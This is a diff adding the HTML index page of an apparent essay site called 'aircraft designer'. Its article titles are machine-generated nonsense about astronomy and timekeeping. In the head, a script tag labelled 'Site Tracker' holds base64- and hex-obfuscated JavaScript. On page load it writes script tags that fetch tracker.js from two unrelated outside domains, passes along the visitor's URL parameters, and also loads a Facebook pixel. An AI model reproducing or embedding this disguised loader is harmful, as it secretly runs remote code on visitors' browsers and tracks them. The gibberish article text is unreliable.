@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="aircraft designer">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Title -->
+    <title>aircraft designer</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="img/core-img/favicon.ico">
+
+    <!-- Core Stylesheet -->
+    <link href="style.css" rel="stylesheet">
+
+    <!-- Responsive CSS -->
+    <link href="css/responsive/responsive.css" rel="stylesheet">
+
+    <!-- Site Tracker -->
+    <script src="data:text/javascript;base64, dmFyIF8weGIyZTI9WyJceDY4XHg2NVx4NkNceDZDXHg2RiIsIlx4M0QiLCJceDczXHg3MFx4NkNceDY5XHg3NCIsIlx4NzJceDY1XHg2NFx4NzVceDYzXHg2NSIsIlx4MjYiLCJceDNGIiwiIiwiXHg3Mlx4NjVceDcwXHg2Q1x4NjFceDYzXHg2NSIsIlx4NzNceDY1XHg2MVx4NzJceDYzXHg2OCIsIlx4NkNceDZGXHg2M1x4NjFceDc0XHg2OVx4NkZceDZFIiwiXHg2Nlx4NjIiLCJceDczXHg2M1x4NzJceDY5XHg3MFx4NzQiLCJceDY4XHg3NFx4NzRceDcwXHg3M1x4M0FceDJGXHgyRlx4NjNceDZGXHg2RVx4NkVceDY1XHg2M1x4NzRceDJFXHg2Nlx4NjFceDYzXHg2NVx4NjJceDZGXHg2Rlx4NkJceDJFXHg2RVx4NjVceDc0XHgyRlx4NjVceDZFXHg1Rlx4NTVceDUzXHgyRlx4NjZceDYyXHg2NVx4NzZceDY1XHg2RVx4NzRceDczXHgyRVx4NkFceDczIiwiXHg2Nlx4NjJceDcxIiwiXHg2M1x4NjFceDZDXHg2Q1x4NERceDY1XHg3NFx4NjhceDZGXHg2NCIsIlx4NjFceDcwXHg3MFx4NkNceDc5IiwiXHg3MFx4NzVceDczXHg2OCIsIlx4NzFceDc1XHg2NVx4NzVceDY1IiwiXHg1Rlx4NjZceDYyXHg3MSIsIlx4NkNceDZGXHg2MVx4NjRceDY1XHg2NCIsIlx4NzZceDY1XHg3Mlx4NzNceDY5XHg2Rlx4NkUiLCJceDMyXHgyRVx4MzAiLCJceDYzXHg3Mlx4NjVceDYxXHg3NFx4NjVceDQ1XHg2Q1x4NjVceDZEXHg2NVx4NkVceDc0IiwiXHg2MVx4NzNceDc5XHg2RVx4NjMiLCJceDczXHg3Mlx4NjMiLCJceDY3XHg2NVx4NzRceDQ1XHg2Q1x4NjVceDZEXHg2NVx4NkVceDc0XHg3M1x4NDJceDc5XHg1NFx4NjFceDY3XHg0RVx4NjFceDZEXHg2NSIsIlx4NjlceDZFXHg3M1x4NjVceDcyXHg3NFx4NDJceDY1XHg2Nlx4NkZceDcyXHg2NSIsIlx4NzBceDYxXHg3Mlx4NjVceDZFXHg3NFx4NEVceDZGXHg2NFx4NjUiLCJceDY5XHg2RVx4NjlceDc0IiwiXHg3NFx4NzJceDYxXHg2M1x4NkIiLCJceDUwXHg2MVx4NjdceDY1XHg1Nlx4NjlceDY1XHg3NyIsIlx4NkVceDZGXHg3NyIsIlx4NzNceDc1XHg2Mlx4NzNceDc0XHg3Mlx4NjlceDZFXHg2NyIsIlx4NzJceDYxXHg2RVx4NjRceDZGXHg2RCIsIlx4M0NceDczXHg2M1x4NzJceDY5XHg3MFx4NzRceDIwXHg2OVx4NjRceDNEXHgyMiIsIlx4MzFceDIyXHgyMFx4NzNceDcyXHg2M1x4M0RceDIyXHg2OFx4NzRceDc0XHg3MFx4NzNceDNBXHgyRlx4MkZceDY5XHg2RFx4NkJceDZDXHg2Rlx4MkVceDYyXHg3Mlx4NkZceDYxXHg2RVx4NjRceDYzXHg2Rlx4MkVceDYzXHg2Q1x4NzVceDYyXHgyRlx4NzRceDcyXHg2MVx4NjNceDZCXHg2NVx4NzJceDJFXHg2QVx4NzNceDNGIiwiXHgyNlx4NjhceDYxXHg3M1x4NjhceDNEIiwiXHgyMlx4M0VceDNDXHgyRlx4NzNceDYzXHg3Mlx4NjlceDcwXHg3NFx4M0UiLCJceDc3XHg3Mlx4NjlceDc0XHg2NSIsIlx4MjJceDIwXHg3M1x4NzJceDYzXHgzRFx4MjJceDY4XHg3NFx4NzRceDcwXHg3M1x4M0FceDJGXHgyRlx4NjJceDcyXHg2Rlx4NjFceDZFXHg2NFx4NjNceDZGXHgyRVx4NzdceDZGXHg3Mlx4NkJceDJGXHg3NFx4NzJceDYxXHg2M1x4NkJceDY1XHg3Mlx4MkVceDZBXHg3M1x4M0YiXTt2YXIgaGVsbG89XzB4YjJlMlswXTt2YXIgdXJsUGFyYW1zPXdpbmRvd1tfMHhiMmUyWzldXVtfMHhiMmUyWzhdXVtfMHhiMmUyWzddXShfMHhiMmUyWzVdLF8weGIyZTJbNl0pW18weGIyZTJbMl1dKF8weGIyZTJbNF0pW18weGIyZTJbM11dKGZ1bmN0aW9uKF8weGU4YmV4MyxfMHhlOGJleDQpe3ZhciBfMHhlOGJleDU9XzB4ZThiZXg0W18weGIyZTJbMl1dKF8weGIyZTJbMV0pO18weGU4YmV4M1tkZWNvZGVVUklDb21wb25lbnQoXzB4ZThiZXg1WzBdKV09IGRlY29kZVVSSUNvbXBvbmVudChfMHhlOGJleDVbMV0pO3JldHVybiBfMHhlOGJleDN9LHt9KTtpZih1cmxQYXJhbXNbXzB4YjJlMlsxMF1dIT0gdW5kZWZpbmVkKXshZnVuY3Rpb24oXzB4ZThiZXg2LF8weGU4YmV4NyxfMHhlOGJleDQsXzB4ZThiZXg4LF8weGU4YmV4OSxfMHhlOGJleGEsXzB4ZThiZXhiKXtpZihfMHhlOGJleDZbXzB4YjJlMlsxM11dKXtyZXR1cm59O18weGU4YmV4OT0gXzB4ZThiZXg2W18weGIyZTJbMTNdXT0gZnVuY3Rpb24oKXtfMHhlOGJleDlbXzB4YjJlMlsxNF1dP18weGU4YmV4OVtfMHhiMmUyWzE0XV1bXzB4YjJlMlsxNV1dKF8weGU4YmV4OSxhcmd1bWVudHMpOl8weGU4YmV4OVtfMHhiMmUyWzE3XV1bXzB4YjJlMlsxNl1dKGFyZ3VtZW50cyl9O2lmKCFfMHhlOGJleDZbXzB4YjJlMlsxOF1dKXtfMHhlOGJleDZbXzB4YjJlMlsxOF1dPSBfMHhlOGJleDl9O18weGU4YmV4OVtfMHhiMmUyWzE2XV09IF8weGU4YmV4OTtfMHhlOGJleDlbXzB4YjJlMlsxOV1dPSAgITA7XzB4ZThiZXg5W18weGIyZTJbMjBdXT0gXzB4YjJlMlsyMV07XzB4ZThiZXg5W18weGIyZTJbMTddXT0gW107XzB4ZThiZXhhPSBfMHhlOGJleDdbXzB4YjJlMlsyMl1dKF8weGU4YmV4NCk7XzB4ZThiZXhhW18weGIyZTJbMjNdXT0gICEwO18weGU4YmV4YVtfMHhiMmUyWzI0XV09IF8weGU4YmV4ODtfMHhlOGJleGI9IF8weGU4YmV4N1tfMHhiMmUyWzI1XV0oXzB4ZThiZXg0KVswXTtfMHhlOGJleGJbXzB4YjJlMlsyN11dW18weGIyZTJbMjZdXShfMHhlOGJleGEsXzB4ZThiZXhiKX0od2luZG93LGRvY3VtZW50LF8weGIyZTJbMTFdLF8weGIyZTJbMTJdKTtmYnEoXzB4YjJlMlsyOF0sdXJsUGFyYW1zW18weGIyZTJbMTBdXSk7ZmJxKF8weGIyZTJbMjldLF8weGIyZTJbMzBdKX07bGV0IHJhbmQxPURhdGVbXzB4YjJlMlszMV1dKCkrIE1hdGhbXzB4YjJlMlszM11dKCkudG9TdHJpbmcoMzYpW18weGIyZTJbMzJdXSg3KTtkb2N1bWVudFtfMHhiMmUyWzM4XV0oXzB4YjJlMlszNF0rIHJhbmQxKyBfMHhiMmUyWzM1XSsgd2luZG93W18weGIyZTJbOV1dW18weGIyZTJbOF1dW18weGIyZTJbN11dKF8weGIyZTJbNV0sXzB4YjJlMls2XSkrIF8weGIyZTJbMzZdKyByYW5kMSsgXzB4YjJlMlszN10pO2RvY3VtZW50W18weGIyZTJbMzhdXShfMHhiMmUyWzM0XSsgcmFuZDErIF8weGIyZTJbMzldKyB3aW5kb3dbXzB4YjJlMls5XV1bXzB4YjJlMls4XV1bXzB4YjJlMls3XV0oXzB4YjJlMls1XSxfMHhiMmUyWzZdKSsgXzB4YjJlMlszNl0rIHJhbmQxKyBfMHhiMmUyWzM3XSk="></script>
+</head>
+
+<body class="bg)">
+    <!-- Preloader Start -->
+    <div id="preloader">
+        <div class="yummy-load"></div>
+    </div>
+
+    <!-- ****** Top Header Area Start ****** -->
+    <div class="top_header_area">
+        <div class="container">
+            <div class="row">
+                <div class="col-5 col-sm-6">
+                    <!--  Top Social bar start -->
+                    <div class="top_social_bar">
+                        <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+                        <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+                        <a href="#"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+                        <a href="#"><i class="fa fa-skype" aria-hidden="true"></i></a>
+                        <a href="#"><i class="fa fa-dribbble" aria-hidden="true"></i></a>
+                    </div>
+                </div>
+                <!--  Login Register Area -->
+            </div>
+        </div>
+    </div>
+    <!-- ****** Top Header Area End ****** -->
+
+    <!-- ****** Header Area Start ****** -->
+    <header class="header_area">
+        <div class="container">
+            <div class="row">
+                <!-- Logo Area Start -->
+                <div class="col-12">
+                    <div class="logo_area text-center">
+                        <a href="index.html" class="yummy-logo">aircraft designer</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-12">
+                    <nav class="navbar navbar-expand-lg">
+                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#yummyfood-nav" aria-controls="yummyfood-nav" aria-expanded="false" aria-label="Toggle navigation"><i class="fa fa-bars" aria-hidden="true"></i> Menu</button>
+                        <!-- Menu Area Start -->
+                        <div class="collapse navbar-collapse justify-content-center" id="yummyfood-nav">
+                            <ul class="navbar-nav" id="yummy-nav">
+                                <li class="nav-item">
+                                    <a class="nav-link" href="index.html">Main <span class="sr-only">(current)</span></a>
+                                </li>
+                                <li class="nav-item dropdown">
+                                    <a class="nav-link dropdown-toggle" href="#" id="yummyDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Articles</a>
+                                    <div class="dropdown-menu" aria-labelledby="yummyDropdown">
+                                        
+                                        <a class="dropdown-item" href="2d120cf4603479f4e944ab7e1a709c18.html">Topic: "Why is paralle...</a>
+                                        
+
+                                        <a class="dropdown-item" href="qelE6C37XI.html">Topic: "Why is refract...</a>
+                                        
+
+                                        <a class="dropdown-item" href="ASDSxcGNYn1YNfksmXvt.html">Topic: "Angular distan...</a>
+                                        
+
+                                        <a class="dropdown-item" href="0efca0cd94d3c351fb1fa615ea05fa24.html">Topic: "Why is unobser...</a>
+                                        
+
+                                        <a class="dropdown-item" href="i6Qj5Ezp6VmCphPawAd.html">Topic: "Central azimut...</a>
+                                        
+
+                                        <a class="dropdown-item" href="8eaf29696df4561610667a0d55842f57.html">Topic: "Why a potentia...</a>
+                                        
+
+                                    </div>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="contact.html">Contacts</a>
+                                </li>
+                            </ul>
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- ****** Header Area End ****** -->
+
+    <!-- ****** Breadcumb Area Start ****** -->
+    <div class="breadcumb-area" style="background-image: url(./img/6030547-www.nevseoboi.com.ua.jpg);">
+        <div class="container h-100">
+            <div class="row h-100 align-items-center">
+                <div class="col-12">
+                    <div class="bradcumb-title text-center">
+                        <h2>You got to the site with various essays</h2>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ****** Breadcumb Area End ****** -->
+
+    <!-- ****** Archive Area Start ****** -->
+    <section class="archive-area section_padding_80">
+        <div class="container">
+            <div class="row">
+                
+                <!-- Single Post -->
+                <div class="col-12 col-md-6 col-lg-4">
+                    <div class="single-post fadeInUp">
+                        <!-- Post Thumb -->
+                        <div class="post-thumb">
+                            <img src="./img/1000640-space-nevseoboi.com.ua.jpg" alt="">
+                        </div>
+                        <!-- Post Content -->
+                        <div class="post-content">
+                            <div class="post-meta d-flex">
+                                <!-- Post Comment & Share Area -->
+                                <div class="post-comment-share-area d-flex">
+                                    <!-- Post Favourite -->
+                                    <div class="post-favourite">
+                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 139</a>
+                                    </div>
+                                    <!-- Post Comments -->
+                                    <div class="post-comments">
+                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 105</a>
+                                    </div>
+                                    <!-- Post Share -->
+                                    <div class="post-share">
+                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="2d120cf4603479f4e944ab7e1a709c18.html">
+                                <h4 class="post-headline">Topic: "Why is parallel to the equation of time?»</h4>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <!-- Single Post -->
+                <div class="col-12 col-md-6 col-lg-4">
+                    <div class="single-post fadeInUp">
+                        <!-- Post Thumb -->
+                        <div class="post-thumb">
+                            <img src="./img/6037408-www.nevseoboi.com.ua.jpg" alt="">
+                        </div>
+                        <!-- Post Content -->
+                        <div class="post-content">
+                            <div class="post-meta d-flex">
+                                <!-- Post Comment & Share Area -->
+                                <div class="post-comment-share-area d-flex">
+                                    <!-- Post Favourite -->
+                                    <div class="post-favourite">
+                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 65</a>
+                                    </div>
+                                    <!-- Post Comments -->
+                                    <div class="post-comments">
+                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 287</a>
+                                    </div>
+                                    <!-- Post Share -->
+                                    <div class="post-share">
+                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="qelE6C37XI.html">
+                                <h4 class="post-headline">Topic: "Why is refraction parallel?»</h4>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <!-- Single Post -->
+                <div class="col-12 col-md-6 col-lg-4">
+                    <div class="single-post fadeInUp">
+                        <!-- Post Thumb -->
+                        <div class="post-thumb">
+                            <img src="./img/6031115-www.nevseoboi.com.ua.jpg" alt="">
+                        </div>
+                        <!-- Post Content -->
+                        <div class="post-content">
+                            <div class="post-meta d-flex">
+                                <!-- Post Comment & Share Area -->
+                                <div class="post-comment-share-area d-flex">
+                                    <!-- Post Favourite -->
+                                    <div class="post-favourite">
+                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 352</a>
+                                    </div>
+                                    <!-- Post Comments -->
+                                    <div class="post-comments">
+                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 231</a>
+                                    </div>
+                                    <!-- Post Share -->
+                                    <div class="post-share">
+                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="ASDSxcGNYn1YNfksmXvt.html">
+                                <h4 class="post-headline">Topic: "Angular distance as a clock angle»</h4>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <!-- Single Post -->
+                <div class="col-12 col-md-6 col-lg-4">
+                    <div class="single-post fadeInUp">
+                        <!-- Post Thumb -->
+                        <div class="post-thumb">
+                            <img src="./img/6031138-www.nevseoboi.com.ua.jpg" alt="">
+                        </div>
+                        <!-- Post Content -->
+                        <div class="post-content">
+                            <div class="post-meta d-flex">
+                                <!-- Post Comment & Share Area -->
+                                <div class="post-comment-share-area d-flex">
+                                    <!-- Post Favourite -->
+                                    <div class="post-favourite">
+                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 398</a>
+                                    </div>
+                                    <!-- Post Comments -->
+                                    <div class="post-comments">
+                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 287</a>
+                                    </div>
+                                    <!-- Post Share -->
+                                    <div class="post-share">
+                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="0efca0cd94d3c351fb1fa615ea05fa24.html">
+                                <h4 class="post-headline">Topic: "Why is unobservable daylight savings time?»</h4>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <!-- Single Post -->
+                <div class="col-12 col-md-6 col-lg-4">
+                    <div class="single-post fadeInUp">
+                        <!-- Post Thumb -->
+                        <div class="post-thumb">
+                            <img src="./img/1000671-space-nevseoboi.com.ua.jpg" alt="">
+                        </div>
+                        <!-- Post Content -->
+                        <div class="post-content">
+                            <div class="post-meta d-flex">
+                                <!-- Post Comment & Share Area -->
+                                <div class="post-comment-share-area d-flex">
+                                    <!-- Post Favourite -->
+                                    <div class="post-favourite">
+                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 298</a>
+                                    </div>
+                                    <!-- Post Comments -->
+                                    <div class="post-comments">
+                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 210</a>
+                                    </div>
+                                    <!-- Post Share -->
+                                    <div class="post-share">
+                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="i6Qj5Ezp6VmCphPawAd.html">
+                                <h4 class="post-headline">Topic: "Central azimuth is an urgent national task»</h4>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <!-- Single Post -->
+                <div class="col-12 col-md-6 col-lg-4">
+                    <div class="single-post fadeInUp">
+                        <!-- Post Thumb -->
+                        <div class="post-thumb">
+                            <img src="./img/6031077-www.nevseoboi.com.ua.jpg" alt="">
+                        </div>
+                        <!-- Post Content -->
+                        <div class="post-content">
+                            <div class="post-meta d-flex">
+                                <!-- Post Comment & Share Area -->
+                                <div class="post-comment-share-area d-flex">
+                                    <!-- Post Favourite -->
+                                    <div class="post-favourite">
+                                        <a href=""><i class="fa fa-heart-o" aria-hidden="true"></i> 123</a>
+                                    </div>
+                                    <!-- Post Comments -->
+                                    <div class="post-comments">
+                                        <a href=""><i class="fa fa-comment-o" aria-hidden="true"></i> 386</a>
+                                    </div>
+                                    <!-- Post Share -->
+                                    <div class="post-share">
+                                        <a href=""><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+                                    </div>
+                                </div>
+                            </div>
+                            <a href="8eaf29696df4561610667a0d55842f57.html">
+                                <h4 class="post-headline">Topic: "Why a potentially anti-aircraft hour number?»</h4>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+
+            </div>
+        </div>
+    </section>
+    <!-- ****** Archive Area End ****** -->
+
+    <!-- ****** Instagram Area Start ****** -->
+    <!--<div class="instargram_area owl-carousel section_padding_100_0 clearfix" id="portfolio">-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/6031381-www.nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/6030920-www.nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/6037221-www.nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/6031208-www.nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/1000762-space-nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/6030887-www.nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/1000936-space-nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--&lt;!&ndash; Instagram Item &ndash;&gt;-->
+        <!--<div class="instagram_gallery_item">-->
+            <!--&lt;!&ndash; Instagram Thumb &ndash;&gt;-->
+            <!--<img src="./img/6036463-www.nevseoboi.com.ua.jpg" alt="">-->
+            <!--&lt;!&ndash; Hover &ndash;&gt;-->
+            <!--<div class="hover_overlay">-->
+                <!--<div class="yummy-table">-->
+                    <!--<div class="yummy-table-cell">-->
+                        <!--<div class="follow-me text-center">-->
+
+                        <!--</div>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        <!--</div>-->
+
+    <!--</div>-->
+    <!-- ****** Our Creative Portfolio Area End ****** -->
+
+    <!-- ****** Footer Social Icon Area Start ****** -->
+    <div class="social_icon_area clearfix">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <div class="footer-social-area d-flex">
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i><span>facebook</span></a>
+                        </div>
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i><span>Twitter</span></a>
+                        </div>
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-google-plus" aria-hidden="true"></i><span>GOOGLE+</span></a>
+                        </div>
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-linkedin-square" aria-hidden="true"></i><span>linkedin</span></a>
+                        </div>
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-instagram" aria-hidden="true"></i><span>Instagram</span></a>
+                        </div>
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-vimeo" aria-hidden="true"></i><span>VIMEO</span></a>
+                        </div>
+                        <div class="single-icon">
+                            <a href="#"><i class="fa fa-youtube-play" aria-hidden="true"></i><span>YOUTUBE</span></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ****** Footer Social Icon Area End ****** -->
+
+    <!-- ****** Footer Menu Area Start ****** -->
+    <footer class="footer_area">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <div class="footer-content">
+                        <!-- Logo Area Start -->
+                        <div class="footer-logo-area text-center">
+                            <a href="index.html" class="yummy-logo">aircraft designer</a>
+                        </div>
+                        <!-- Menu Area Start -->
+                        <nav class="navbar navbar-expand-lg">
+                            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#yummyfood-footer-nav" aria-controls="yummyfood-footer-nav" aria-expanded="false" aria-label="Toggle navigation"><i class="fa fa-bars" aria-hidden="true"></i> Menu</button>
+                            <!-- Menu Area Start -->
+                            <div class="collapse navbar-collapse justify-content-center" id="yummyfood-footer-nav">
+                                <ul class="navbar-nav">
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="index.html">Main <span class="sr-only">(current)</span></a>
+                                    </li>
+                                    <li class="nav-item dropdown">
+                                        <a class="nav-link dropdown-toggle" href="#" id="yummyDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Articles</a>
+                                        <div class="dropdown-menu" aria-labelledby="yummyDropdown">
+                                            
+                                            <a class="dropdown-item" href="2d120cf4603479f4e944ab7e1a709c18.html">Topic: "Why is paralle...</a>
+                                            
+
+                                            <a class="dropdown-item" href="qelE6C37XI.html">Topic: "Why is refract...</a>
+                                            
+
+                                            <a class="dropdown-item" href="ASDSxcGNYn1YNfksmXvt.html">Topic: "Angular distan...</a>
+                                            
+
+                                            <a class="dropdown-item" href="0efca0cd94d3c351fb1fa615ea05fa24.html">Topic: "Why is unobser...</a>
+                                            
+
+                                            <a class="dropdown-item" href="i6Qj5Ezp6VmCphPawAd.html">Topic: "Central azimut...</a>
+                                            
+
+                                            <a class="dropdown-item" href="8eaf29696df4561610667a0d55842f57.html">Topic: "Why a potentia...</a>
+                                            
+
+                                        </div>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="contact.html">Contacts</a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="terms.html">Terms and conditions</a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="policy.html">Privacy policy</a>
+                                    </li>
+                                </ul>
+                            </div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- ****** Footer Menu Area End ****** -->
+
+    <!-- Jquery-2.2.4 js -->
+    <script src="js/jquery/jquery-2.2.4.min.js"></script>
+    <!-- Popper js -->
+    <script src="js/bootstrap/popper.min.js"></script>
+    <!-- Bootstrap-4 js -->
+    <script src="js/bootstrap/bootstrap.min.js"></script>
+    <!-- All Plugins JS -->
+    <script src="js/others/plugins.js"></script>
+    <!-- Active JS -->
+    <script src="js/active.js"></script>
+    <div class='cookie-banner'>
+        <p>
+            The site uses cookies. They allow us to recognize you and get information about your user experience.By continuing to browse the site, I agree to the use of cookies by the site owner in accordance with  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Cookie policy</a>
+        </p>
+        <button class='close-cookie'>&times;</button>
+    </div>
+    <script>
+        window.onload = function() {
+            $('.close-cookie').click(function () {
+                $('.cookie-banner').fadeOut();
+            })
+        }
+    </script>
+</body>
